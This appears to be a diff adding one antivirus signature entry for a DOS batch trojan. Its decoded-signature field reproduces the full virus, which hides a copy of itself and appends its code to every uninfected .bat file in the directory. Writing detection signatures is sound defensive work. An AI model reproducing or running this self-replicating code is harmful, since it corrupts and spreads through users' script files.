@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36707
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off%[log]% if '%1=='in_ goto infect if exist c:log.bat goto cool if not exist %0 goto end find "log"<%0>c:log.bat attrib +h c:metra.bat :cool for %%t in (*.bat) do call c:log in_ %%t goto end :infect find "log"<%2>nul if not errorlevel 1 goto end type c:log.bat>>%2 :end pause
